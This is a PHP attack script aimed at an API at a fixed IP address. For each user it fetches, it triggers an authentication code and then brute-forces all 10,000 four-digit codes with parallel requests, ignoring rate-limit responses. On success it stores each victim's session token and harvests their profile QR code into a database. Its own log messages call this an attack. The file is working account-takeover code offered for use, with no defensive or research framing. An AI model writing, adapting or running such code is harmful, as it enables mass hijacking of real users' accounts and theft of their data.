<?php

require_once 'db.lib.php';

function getUsersArray()
{
    logi('Load users list ...');
    if (!$users = file_get_contents("http://185.251.89.141/api/v1/users")) return logi('Users load error');
    logi('Users loaded, parsing JSON ...');
    return json_decode($users, true);
}

function requestAuthCode($user, $type = 'email')
{
    if (!$response = file_get_contents(
        $file = "http://185.251.89.141/api/v1/generate_code",
        $use_include_path = false,
        stream_context_create(['http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json' . PHP_EOL,
            'content' => '{
	"device_id":"06ca5a4773fc742cb14856ab5e5e76d37cd65743f7730f82938fd5673c8a2fd8",
	"type":"' . $type . '","user_id":"' . $user['id'] . '"}']]))) return false;
    return $response;
}

function authCodeRequestsHandler($user)
{
    for ($i = 0; $i < 100; $i++) {
        if ($token = initMultipleCodeRequests($user, $i * 100, $i * 100 + 99)) return $token;
    }
    return false;
}

function initMultipleCodeRequests($user, $from, $to)
{
    logi('Requesting from ' . $from . ' to ' . $to);
    $mh = curl_multi_init();
    $curls = [];
    for ($i = $from; $i <= $to; $i++) {
        $code = str_pad($i, 4, '0', STR_PAD_LEFT);
        $curls[$i] = curl_init();
        curl_setopt_array($curls[$i], [
            CURLOPT_URL => "http://185.251.89.141/api/v1/auth",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POSTFIELDS => "{\n    \"device_id\": \"06ca5a4773fc742cb14856ab5e5e76d37cd65743f7730f82938fd5673c8a2fd8\",\n    \"password\": \"" . $code . "\",\n    \"username\": \"" . $user['username'] . "\"\n}",
            CURLOPT_HTTPHEADER => ["Content-Type: application/json"]]);
        curl_multi_add_handle($mh, $curls[$i]);
    }
    do {
        $status = curl_multi_exec($mh, $active);
        if ($active) {
            curl_multi_select($mh);
        }
    } while ($active && $status == CURLM_OK);
    foreach ($curls as $curl) {
        curl_multi_remove_handle($mh, $curl);
    }
    curl_multi_close($mh);
    foreach ($curls as $id => $curl) {
        $response = curl_multi_getcontent($curl);
        if (curl_getinfo($curl, CURLINFO_HTTP_CODE) == 400 ||
            curl_getinfo($curl, CURLINFO_HTTP_CODE) == 429) continue;
        $result = json_decode($response, true);
        if (isset($result['token'])) {
            logi('Token found, saving ...');
            DB::insert('users', ['id' => $user['id'], 'token' => $result['token']]);
            return $result['token'];
            break;
        }
    }
    return false;
}

function getUserProfile($token)
{
    if (!$response = file_get_contents(
        $file = "http://185.251.89.141/api/v1/profile",
        $use_include_path = false,
        stream_context_create(['http' => [
            'method' => 'GET',
            'header' => 'Content-Type: application/json' . PHP_EOL .
                'Authorization: Bearer ' . $token]]))) return logi('Profile data not loaded');
    return json_decode($response, true);
}

function getUserQRUrl($userProfile, $user)
{
    if (!$userProfile['qrcode'] || !DB::update('users', ['qr_url' => $userProfile['qrcode']], 'id=' . $user['id'])) return false;
    return $userProfile['qrcode'];
}

function resetUser($user)
{
    DB::delete('users', 'id=' . $user['id']);
    return false;
}

function getUserToken($user)
{
    if (!$result = DB::select('users', ['*'], 'id=' . $user['id'])) return false;
    return mysqli_fetch_assoc($result)['token'];
}

function userHandler($user)
{
    logi('Initialize User ' . $user['id']);
    $GLOBALS['user_id'] = $user['id'];
    $token = false;
    if (mysqli_num_rows(DB::select('users', ['*'], 'id=' . $user['id'])) == 0) {
        logi('Is a New user, requesting code ...');
        ob_start();
        if (!requestAuthCode($user)) return logi('Failed, got Error: ' . ob_get_clean());
        @ob_end_clean();
        logi('Initialize attack ...');
        if (!$token = authCodeRequestsHandler($user)) return logi('Failed, code expired');
    }
    if (!$token && !$token = getUserToken($user)) return false;
    logi('Loading User Profile data ...');
    if (!$userProfile = getUserProfile($token)) return resetUser($user);
    logi('Reading QR Url ...');
    if (!$QRUrl = getUserQRUrl($userProfile, $user)) return resetUser($user);
    logi('User Attack Successful !');
    return true;
}

function logi($message)
{
    @ob_end_clean();
    echo $message . PHP_EOL;
    file_put_contents('log' . (isset($GLOBALS['user_id']) && $GLOBALS['user_id'] ? '_' . $GLOBALS['user_id'] : '') . '.txt', $message . PHP_EOL, FILE_APPEND);
    return false;
}

function init()
{
    logi('Initialise attack ...');
    if (!$users = getUsersArray()) return logi('Users not loaded, aborting ...');
    logi('Loaded ' . count($users) . ' users, initialize loop ...');
    foreach ($users as $user) {
        unset($GLOBALS['user_id']);
        userHandler($user);
    }
}

init();